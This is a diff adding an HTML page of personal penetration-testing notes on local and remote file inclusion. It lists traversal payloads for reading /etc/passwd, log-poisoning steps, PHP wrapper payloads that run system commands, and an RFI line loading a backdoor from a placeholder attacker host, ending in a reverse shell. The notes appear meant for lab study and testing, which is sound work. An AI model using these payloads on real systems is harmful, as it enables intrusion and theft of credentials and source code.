@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Web Fuzzing - AD Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <!-- NAVBAR -->
+    <nav>
+        <a href="index.html">Home</a>
+
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#">Privesc ▾</a>
+            <div class="dropdown-content">
+                <a href="windows_privesc.html">Windows PrivEsc</a>
+                <a href="linux-privesc.html">Linux Privesc</a>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#">Web ▾</a>
+
+            <div class="dropdown-content">
+
+                <div class="dropdown-sub">
+                    <a href="#">Finger Printing ▾</a>
+
+                    <div class="dropdown-subcontent">
+                        <a href="directoryBruteForce.html">Directory Brute Force</a>
+                    </div>
+                </div>
+
+                 <div class="dropdown-sub">
+                    <a href="#">Attacks ▾</a>
+
+                    <div class="dropdown-subcontent">
+                        <a href="directoryTraversal.html">Directory Travresal</a>
+                        <a href="fileInclusions.html">File Inclusions</a>
+                        <a href="fileUpload.html">File Uploads</a>
+                        <a href="osCommand.html">OS Command Injections</a>
+                        <a href="sqli.html">SQL Injections</a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        <a href="file-transfer.html">File Transfer</a>
+        <a href="checklist.html">Checklist</a>
+        <a href="pivoting.html">Pivoting</a>
+    </nav>
+     <div class="search-bar">
+        <input type="text" id="global-search" placeholder="Buscar..." />
+        <button onclick="performSearch()">🔍 Search</button>
+        <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
+        <div id="search-results" class="search-results collapsed"></div>
+    </div>
+    <!-- CONTENT -->
+  
+<div class="container">
+
+    <!-- LFI CONCEPT -->
+    <div class="section">
+        <div class="section-header">Concept</div>
+        <div class="section-content">
+
+            <p>Local File Inclusion (LFI) allows an attacker to include files from the local system via vulnerable parameters such as:</p>
+
+            <pre><code>?page=../../../../etc/passwd
+?page=../../../../boot.ini</code></pre>
+
+            <p>Typical vulnerable code:</p>
+
+            <pre><code>include($_GET['page']);</code></pre>
+
+        </div>
+    </div>
+
+    <!-- DETECTION -->
+    <div class="section">
+        <div class="section-header">Detection</div>
+        <div class="section-content">
+
+            <h3>Basic LFI test</h3>
+            <pre><code>?page=../../../../../../../../etc/passwd
+?page=../../../../../../../../boot.ini</code></pre>
+
+            <p>If the response includes file contents → LFI confirmed.</p>
+
+        </div>
+    </div>
+
+    <!-- EXPLOITATION -->
+    <div class="section">
+        <div class="section-header">Exploitation</div>
+        <div class="section-content">
+
+            <h3>Directory traversal</h3>
+            <pre><code>../../../../../../../../etc/passwd</code></pre>
+
+            <h3>Windows example</h3>
+            <pre><code>../../../../../../../../windows/system32/drivers/etc/hosts</code></pre>
+
+            <h3>Common goals</h3>
+            <ul>
+                <li>Read configuration files</li>
+                <li>Extract credentials</li>
+                <li>Access source code</li>
+                <li>Achieve RCE via wrappers or log poisoning</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- LOG POISONING -->
+    <div class="section">
+        <div class="section-header">Log Poisoning</div>
+        <div class="section-content">
+
+            <h3>Linux log paths</h3>
+            <pre><code>/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/httpd/access_log
+/var/log/nginx/access.log</code></pre>
+
+            <h3>Windows log paths</h3>
+            <pre><code>C:\xampp\apache\logs\access.log
+C:\xampp\apache\logs\error.log
+C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log</code></pre>
+
+            <h3>Step 1 – Inject payload</h3>
+            <pre><code>curl -A "&lt;PHP_REVERSHELL&gt;" http://target/</code></pre>
+
+            <h3>Step 2 – Trigger LFI</h3>
+            <pre><code>?page=../../../../../../../../../var/log/apache2/access.log&cmd=id</code></pre>
+
+            <h3>Step 3 – Handle spaces</h3>
+            <pre><code>cmd=ls%20-la</code></pre>
+
+            <h3>Windows trigger</h3>
+            <pre><code>?page=../../../../../../../../xampp/apache/logs/access.log&cmd=dir</code></pre>
+
+        </div>
+    </div>
+
+    <!-- PHP WRAPPERS -->
+    <div class="section">
+        <div class="section-header">PHP Wrappers</div>
+        <div class="section-content">
+
+            <h3>php://filter (read source code)</h3>
+            <pre><code>?page=php://filter/convert.base64-encode/resource=index.php</code></pre>
+
+            <p>Decode output:</p>
+            <pre><code>echo BASE64_OUTPUT | base64 -d</code></pre>
+
+            <h3>data:// (code execution)</h3>
+            <pre><code>?page=data://text/plain,&lt;?php system('id'); ?&gt;</code></pre>
+
+            <h3>data:// base64</h3>
+            <pre><code>?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==</code></pre>
+
+            <h3>php://input</h3>
+            <pre><code>curl -X POST -d "&lt;?php system('ls'); ?&gt;" \
+"http://target/index.php?page=php://input"</code></pre>
+
+            <h3>expect:// (if enabled)</h3>
+            <pre><code>?page=expect://id</code></pre>
+
+        </div>
+    </div>
+
+    <!-- RFI -->
+    <div class="section">
+        <div class="section-header">RFI</div>
+        <div class="section-content">
+
+            <p>Remote File Inclusion requires <code>allow_url_include=On</code>.</p>
+
+            <h3>Example attack</h3>
+            <pre><code>python3 -m http.server 80</code></pre>
+
+            <pre><code>?page=http://attacker-ip/simple-backdoor.php&cmd=ls</code></pre>
+
+            <h3>Reverse shell placeholder</h3>
+            <pre><code>&lt;PHP_REVERSHELL&gt;</code></pre>
+
+        </div>
+    </div>
+
+    <!-- WORKFLOW -->
+    <div class="section">
+        <div class="section-header">Workflow</div>
+        <div class="section-content">
+
+            <ol>
+                <li>Confirm LFI with <code>/etc/passwd</code></li>
+                <li>Try Windows equivalent (<code>boot.ini</code>)</li>
+                <li>Read source using <code>php://filter</code></li>
+                <li>Attempt log poisoning</li>
+                <li>Try PHP wrappers for RCE</li>
+                <li>Escalate to reverse shell</li>
+            </ol>
+
+        </div>
+    </div>
+
+</div>
+    <!-- SCRIPT -->
+    <script>
+                document.querySelectorAll(".section-header").forEach(h => {
+                        h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+                });
+                function toggleSearchResults() {
+                        const results = document.getElementById("search-results");
+                        const toggleBtn = document.getElementById("toggle-results");
+
+                        results.classList.toggle("collapsed");
+
+                        if (results.classList.contains("collapsed")) {
+                                toggleBtn.textContent = "▼";
+                        } else {
+                                toggleBtn.textContent = "▲";
+                        }
+                }
+
+                function performSearch() {
+                        const query = document.getElementById("global-search").value.toLowerCase();
+                        const resultsContainer = document.getElementById("search-results");
+                        resultsContainer.innerHTML = "";
+
+                        if (!query) {
+                                resultsContainer.classList.add("collapsed");
+                                return;
+                        }
+
+                        const allElements = Array.from(document.body.querySelectorAll("*"))
+                                .filter(el => el.children.length === 0 && el.textContent.toLowerCase().includes(query));
+
+                        if (allElements.length === 0) {
+                                resultsContainer.innerHTML = "<div>No se encontraron resultados</div>";
+                        } else {
+                                allElements.forEach((el, idx) => {
+                                        let container = el.closest(".section, .sub-section") || el;
+
+                                        if (!container.id) {
+                                                container.id = `search-target-${idx}`;
+                                        }
+
+                                        const div = document.createElement("div");
+                                        div.textContent = el.textContent;
+                                        div.style.cursor = "pointer";
+                                        div.style.padding = "5px 10px";
+                                        div.style.borderBottom = "1px solid #1e293b";
+                                        div.onmouseover = () => div.style.backgroundColor = "#1e293b";
+                                        div.onmouseout = () => div.style.backgroundColor = "";
+                                        div.onclick = () => {
+                                                if (container.classList.contains("section") || container.classList.contains("sub-section")) {
+                                                        container.classList.add("active");
+                                                }
+
+                                                container.scrollIntoView({ behavior: "smooth", block: "center" });
+
+                                                container.classList.add("highlight-fade");
+                                                setTimeout(() => container.classList.remove("highlight-fade"), 2000);
+                                        };
+
+                                        resultsContainer.appendChild(div);
+                                });
+                        }
+
+                        resultsContainer.classList.remove("collapsed");
+                }
+        </script>
+
+</body>
+
+</html>
